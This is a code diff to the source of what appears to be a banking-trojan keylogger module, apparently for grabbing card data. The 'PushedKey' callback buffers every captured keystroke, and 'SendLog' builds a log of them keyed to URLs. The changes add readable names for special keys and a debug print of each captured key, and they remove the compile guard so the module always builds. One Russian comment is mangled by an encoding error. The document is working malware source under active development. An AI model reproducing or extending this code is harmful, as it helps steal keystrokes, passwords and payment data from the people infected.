@@ -1,7 +1,7 @@
 
  #include "Modules.h"
 
- #ifdef CCH
+ //#ifdef CCH
 //===================================================================
 
 
@@ -15,7 +15,7 @@
 #include "cc.h"
 
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace DBGCC
 {
@@ -146,15 +146,26 @@ static void SendLog( UrlKeys* uk )
 			i--;
 			delim++;
 		}
-		if( GetNonPrintCharText( c, buf ) )
+		const char* nameKey = 0;
+		switch(c)
 		{
-			m_lstrcat( log, buf );
-			STR::Free(buf);
+			case VK_RETURN:		nameKey = "{Enter}"; break;
+			case CHAR_DELETE:	nameKey = "{Del}"; break;
+			case CHAR_LEFT:		nameKey = "{Left}"; break;
+			case CHAR_RIGHT:	nameKey = "{Right}"; break;
+			case CHAR_UP:		nameKey = "{Up}"; break;
+			case CHAR_DOWN:		nameKey = "{Down}"; break;
+			case CHAR_BACK:		nameKey = "{Back}"; break;
+			case CHAR_TAB:		nameKey = "{Tab}"; break;
+		}
+		if( nameKey )
+		{
+			m_lstrcat( log, nameKey );
 		}
 		else
 		{
 			char buf[16];
-			if( (unsigned char)uk->keys[i] < 32 )
+			if( c < 32 )
 			{
 				CharToHex( c, buf );
 			}
@@ -220,6 +231,7 @@ static void WINAPI PushedKey(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 	char* keys = (char*)Data;
 	while( *keys )
 	{
+		CCDBG( "CC", "Key: %c (%02x)", *keys, (int)(unsigned char)*keys );
 		currData->endPos++;
 		if( currData->endPos >= sizeof(currData->keys) ) //буфер заполнен, сдвигаем его, удал€€ 1-й символ
 		{
@@ -284,4 +296,4 @@ bool Init(DWORD hashApp)
 
 
 //===================================================================
- #endif  /* CCH */
+// #endif  /* CCH */
